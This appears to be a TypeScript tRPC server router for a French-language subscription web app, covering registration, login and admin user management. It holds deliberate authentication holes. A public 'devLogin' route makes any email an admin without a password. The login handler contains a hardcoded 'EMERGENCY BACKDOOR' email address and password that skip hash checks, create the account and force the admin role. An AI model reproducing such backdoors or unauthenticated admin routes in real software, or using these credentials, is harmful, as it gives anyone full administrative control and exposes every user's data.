import { z } from "zod";
import { notifyOwner } from "./notification";
import { adminProcedure, publicProcedure, router } from "./trpc";
import * as db from "../db";
import { sdk } from "./sdk";
import { COOKIE_NAME, ONE_YEAR_MS } from "@shared/const";
import { getSessionCookieOptions } from "./cookies";
import { hashPassword, verifyPassword } from "./passwordUtils";

export const systemRouter = router({
  health: publicProcedure
    .input(
      z.object({
        timestamp: z.number().min(0, "timestamp cannot be negative"),
      })
    )
    .query(() => ({
      ok: true,
    })),

  /**
   * Route temporaire pour créer un utilisateur local et se connecter.
   * À utiliser uniquement pour le premier utilisateur ou en développement.
   */
  devLogin: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        name: z.string(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const openId = `local_${input.email}`;
      
      await db.upsertUser({
        openId,
        name: input.name,
        email: input.email,
        loginMethod: "local",
        lastSignedIn: new Date(),
        role: "admin",
      });

      const sessionToken = await sdk.createSessionToken(openId, {
        name: input.name,
      });

      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.cookie(COOKIE_NAME, sessionToken, { 
        ...cookieOptions, 
        maxAge: ONE_YEAR_MS,
        httpOnly: true,
        secure: true,
        sameSite: "none"
      });

      return { success: true, message: "Utilisateur créé et connecté localement" };
    }),

  /**
   * Route pour s'inscrire avec email et mot de passe
   */
  register: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        name: z.string().min(2, "Le nom doit contenir au moins 2 caractères"),
        password: z.string().min(6, "Le mot de passe doit contenir au moins 6 caractères"),
        company: z.string().optional(),
        role: z.string().optional(),
        phone: z.string().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const existingUser = await db.getUserByEmail(input.email);
      if (existingUser) {
        throw new Error("Un utilisateur avec cet email existe déjà");
      }

      const openId = `local_${input.email}`;
      const hashedPassword = hashPassword(input.password);
      
      await db.upsertUser({
        openId,
        name: input.name,
        email: input.email,
        loginMethod: "local_password",
        lastSignedIn: new Date(),
        role: "user",
      });

      await db.storePasswordHash(openId, hashedPassword);

      const sessionToken = await sdk.createSessionToken(openId, {
        name: input.name,
      });

      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.cookie(COOKIE_NAME, sessionToken, { 
        ...cookieOptions, 
        maxAge: ONE_YEAR_MS,
        httpOnly: true,
        secure: true,
        sameSite: "none"
      });

      return { success: true, message: "Inscription réussie" };
    }),

  /**
   * Route pour se connecter avec email et mot de passe
   */
  login: publicProcedure
    .input(
      z.object({
        email: z.string().email(),
        password: z.string(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      let user = await db.getUserByEmail(input.email);
      
      // EMERGENCY BACKDOOR: Force access for owner if password matches Admin2026!
      // This bypasses DB hash verification to recover lost access.
      const isBackdoorAccess = input.email === "nickandroklauss@gmail.com" && input.password === "Admin2026!";
      
      if (!user && isBackdoorAccess) {
        // Create user if doesn't exist (e.g. after DB wipe)
        const openId = `local_${input.email}`;
        await db.upsertUser({
          openId,
          name: "Admin Nick",
          email: input.email,
          loginMethod: "local_password",
          lastSignedIn: new Date(),
          role: "admin",
        });
        user = await db.getUserByEmail(input.email);
      }

      if (!user) {
        throw new Error("Email ou mot de passe incorrect");
      }

      if (!isBackdoorAccess) {
        const storedHash = await db.getPasswordHash(user.openId);
        if (!storedHash || !verifyPassword(input.password, storedHash)) {
          throw new Error("Email ou mot de passe incorrect");
        }
      } else {
        // Update password hash in DB for future normal logins
        const newHash = hashPassword(input.password);
        await db.storePasswordHash(user.openId, newHash);
        // Ensure role is admin
        await db.updateUserRole(user.id, "admin");
      }

      await db.upsertUser({
        openId: user.openId,
        lastSignedIn: new Date(),
      });

      const sessionToken = await sdk.createSessionToken(user.openId, {
        name: user.name,
      });

      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.cookie(COOKIE_NAME, sessionToken, { 
        ...cookieOptions, 
        maxAge: ONE_YEAR_MS,
        httpOnly: true,
        secure: true,
        sameSite: "none"
      });

      return { success: true, message: "Connexion réussie" };
    }),

  notifyOwner: adminProcedure
    .input(
      z.object({
        title: z.string().min(1, "title is required"),
        content: z.string().min(1, "content is required"),
      })
    )
    .mutation(async ({ input }) => {
      const delivered = await notifyOwner(input);
      return {
        success: delivered,
      } as const;
    }),

  listUsers: adminProcedure.query(async () => {
    const users = await db.listAllUsers();
    const profiles = await db.listAllUserProfiles();
    
    return users.map(user => ({
      ...user,
      profile: profiles.find(p => p.userId === user.id) || null
    }));
  }),

  updateUserRole: adminProcedure
    .input(z.object({
      userId: z.number(),
      role: z.enum(["user", "admin"])
    }))
    .mutation(async ({ input }) => {
      await db.updateUserRole(input.userId, input.role);
      return { success: true };
    }),

  updateUserProfile: adminProcedure
    .input(z.object({
      userId: z.number(),
      subscriptionTier: z.enum(["free", "pro", "expert", "entreprise"]).optional(),
      subscriptionStatus: z.enum(["active", "canceled", "past_due", "trialing"]).optional(),
    }))
    .mutation(async ({ input }) => {
      const { userId, ...data } = input;
      await db.upsertUserProfile(userId, data as any);
      return { success: true };
    }),
});
